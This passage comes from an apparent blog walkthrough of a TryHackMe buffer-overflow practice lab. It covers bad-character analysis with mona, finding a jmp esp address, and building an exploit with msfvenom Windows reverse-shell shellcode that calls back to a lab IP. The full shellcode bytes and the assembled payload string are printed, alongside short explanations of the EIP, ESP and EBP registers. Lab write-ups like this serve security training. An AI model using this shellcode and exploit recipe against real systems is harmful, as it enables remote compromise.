title="\x73">\x73</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x79">\x79</span><span class="token entity" title="\x7a">\x7a</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\x7c">\x7c</span><span class="token entity" title="\x7d">\x7d</span><span class="token entity" title="\x7e">\x7e</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x81">\x81</span><span class="token entity" title="\x82">\x82</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\x84">\x84</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x89">\x89</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x8d">\x8d</span><span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x90">\x90</span><span class="token entity" title="\x91">\x91</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x96">\x96</span><span class="token entity" title="\x97">\x97</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x9e">\x9e</span><span class="token entity" title="\x9f">\x9f</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\xa3">\xa3</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\xab">\xab</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\xb4">\xb4</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xb6">\xb6</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\xba">\xba</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\xbd">\xbd</span><span class="token entity" title="\xbe">\xbe</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\xc4">\xc4</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xca">\xca</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\xd4">\xd4</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xdb">\xdb</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xe4">\xe4</span><span class="token entity" title="\xe5">\xe5</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xea">\xea</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xf1">\xf1</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xf5">\xf5</span><span class="token entity" title="\xf6">\xf6</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xfb">\xfb</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\xff">\xff</span>")'</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/IUHfkJ2.png"></p>
<p>Better</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona compare -f C:<span class="token punctuation">\</span>mona<span class="token punctuation">\</span>oscp<span class="token punctuation">\</span>bytearray.bin -a esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/Qr2sOhM.png"></p>
<p><img src="https://i.imgur.com/0a5jN8g.png"></p>
<p>I have an another problem:  </p>
<p><img src="https://i.imgur.com/Rffd7L0.png"></p>
<p>The 4 first bad chars are normal but the others are not, the EIP dsplay 42424242 so it should be good, and itâ€™s not a problem of encoding because I have the 4 first bad chars.</p>
<p>I will remove <code>\x07\x08</code> and <code>\x2e\x2f</code> from my payload and mona.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona bytearray -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x2f">\x2f</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/PVD0KUC.png"></p>
<p>The problem still here.  </p>
<p><img src="https://i.imgur.com/qUOFojr.png"></p>
<p>Why this one is not at c2 ?<br>Where is a0 ? If we add a0 to the string and it should be good.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x07<span class="token punctuation">\</span>x08<span class="token punctuation">\</span>x2e<span class="token punctuation">\</span>x2f<span class="token punctuation">\</span>xa0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>And no, itâ€™s not good, because for exemple <code>\x07\x08</code>:<br>The <code>\x07</code> is the bad character but the <code>\x08 is corrupted</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x07<span class="token punctuation">\</span>x2e<span class="token punctuation">\</span>xa0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>It was super hard at the end, Try hack me does not explain this.</p>
<h1 id="Find-the-jump-point"><a href="#Find-the-jump-point" class="headerlink" title="Find the jump point"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Find-the-jump-point" title="Find the jump point"></a>Find the jump point</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona jmp -r esp -cpb <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\xa0">\xa0</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/5XH7lvx.png"></p>
<p>This command finds all â€œjmp espâ€ (or equivalent) instructions with addresses that donâ€™t contain any of the badchars specified.<br>So thatâ€™s where I can inject a shellcode without badchars.<br>We need to convert it in little indian.<br>You need to inverse the Bytes.<br>So <code>625011af</code> = <code>\xaf\x11\x50\x62</code><br>It will be our <code>jmp</code>.</p>
<h1 id="Generate-Payload"><a href="#Generate-Payload" class="headerlink" title="Generate Payload."></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Generate-Payload" title="Generate Payload."></a>Generate Payload.</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.8</span>.50.167 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4848</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\xa0">\xa0</span>"</span> -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/eEwvUKK.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xba">\xba</span><span class="token entity" title="\x17">\x17</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc9">\xc9</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x91">\x91</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x7e">\x7e</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\x7c">\x7c</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x55">\x55</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x7f">\x7f</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x5a">\x5a</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\xa6">\xa6</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x0d">\x0d</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x19">\x19</span><span class="token entity" title="\xce">\xce</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x93">\x93</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x44">\x44</span><span class="token entity" title="\x89">\x89</span><span class="token entity" title="\x5d">\x5d</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\x9a">\x9a</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\xc2">\xc2</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xef">\xef</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xcb">\xcb</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x4e">\x4e</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xa3">\xa3</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\xe0">\xe0</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\xf9">\xf9</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\xe3">\xe3</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x91">\x91</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xba">\xba</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x39">\x39</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\xa3">\xa3</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x72">\x72</span><span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x2d">\x2d</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x64">\x64</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xbe">\xbe</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\x66">\x66</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x49">\x49</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\xf1">\xf1</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\xbe">\xbe</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\xb4">\xb4</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x63">\x63</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xbd">\xbd</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\xd4">\xd4</span><span class="token entity" title="\x0e">\x0e</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xf5">\xf5</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x54">\x54</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\x23">\x23</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\xb6">\xb6</span><span class="token entity" title="\x91">\x91</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\x89">\x89</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x2a">\x2a</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x61">\x61</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="Prepend-NOPs"><a href="#Prepend-NOPs" class="headerlink" title="Prepend NOPs"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Prepend-NOPs" title="Prepend NOPs"></a>Prepend NOPs</h1><p>Thatâ€™s something uou have to add befor the payload to let some space for the payload to unpack.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">padding <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span> * <span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/VhHLvKO.png"></p>
<h1 id="Preparing-the-Exploit"><a href="#Preparing-the-Exploit" class="headerlink" title="Preparing the Exploit"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Preparing-the-Exploit" title="Preparing the Exploit"></a>Preparing the Exploit</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">=</span> <span class="token string">"OVERFLOW "</span>
offset <span class="token operator">=</span> <span class="token number">1978</span>*<span class="token string">"A"</span>
jmp <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x62">\x62</span>"</span>
nops <span class="token operator">=</span> <span class="token number">16</span>*<span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span>
shellcode <span class="token operator">=</span> <span class="token variable"><span class="token variable">$(</span>msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.8</span>.50.167 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4848</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\xa0">\xa0</span>"</span> -f c<span class="token variable">)</span></span>


string <span class="token operator">=</span> <span class="token builtin class-name">command</span> + offset + jmp + nops + shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Instead of the variable jmp we had BBBB who was in the EIP<br>Then we put the nops to let the payload unpack</p>
<h2 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#EIP" title="EIP"></a>EIP</h2><p>EIP stands for â€œExtended Instruction Pointerâ€ and it is a 32-bit register that points to the memory address of the next instruction to be executed. As a program runs, EIP is updated to point to the next instruction in memory.</p>
<p>So in our case the next instruction would be the jmp</p>
<h2 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#ESP" title="ESP"></a>ESP</h2><p>ESP stands for â€œExtended Stack Pointerâ€ and it is a 32-bit register that points to the top of the stack. The stack is a portion of memory used to store local variables and function call data. As data is pushed onto the stack, ESP is decremented to point to the new top of the stack. As data is popped off the stack, ESP is incremented to point to the new top of the stack.</p>
<h2 id="EBP"><a href="#EBP" class="headerlink" title="EBP"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#EBP" title="EBP"></a>EBP</h2><p>EBP stands for â€œExtended Base Pointerâ€ and it is a 32-bit register that is used as a reference point for accessing function parameters and local variables stored on the stack. When a function is called, the value of ESP is saved in EBP, and the stack is used to store the functionâ€™s local variables and parameters. EBP is used as a reference point to access this data on the stack.</p>
<p><a href="https://www.uperesia.com/buffer-overflow-explained">https://www.uperesia.com/buffer-overflow-explained</a>  </p>
<p><img src="https://i.imgur.com/kIqyLwZ.png"></p>
